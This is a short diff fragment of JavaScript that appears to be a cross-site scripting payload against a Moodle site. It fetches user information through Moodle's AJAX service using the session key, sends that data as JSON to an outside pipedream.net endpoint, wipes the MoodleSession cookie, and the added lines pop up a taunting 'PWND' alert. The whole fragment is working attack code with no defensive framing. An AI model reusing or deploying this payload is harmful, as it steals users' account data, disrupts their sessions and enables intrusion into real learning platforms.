@@ -38,4 +38,7 @@ fetch('/lib/ajax/service.php?sesskey='+s,{
 .then(d=>{
     fetch('https://eoizd5ecl7m1qqn.m.pipedream.net/?userinfo='+encodeURIComponent(JSON.stringify(d)),{mode:'no-cors'});
     document.cookie='MoodleSession=;path=/;';
+})
+.finally(() => {
+    alert("BTW EZ PWND BY NZRXHX ;)");
 });
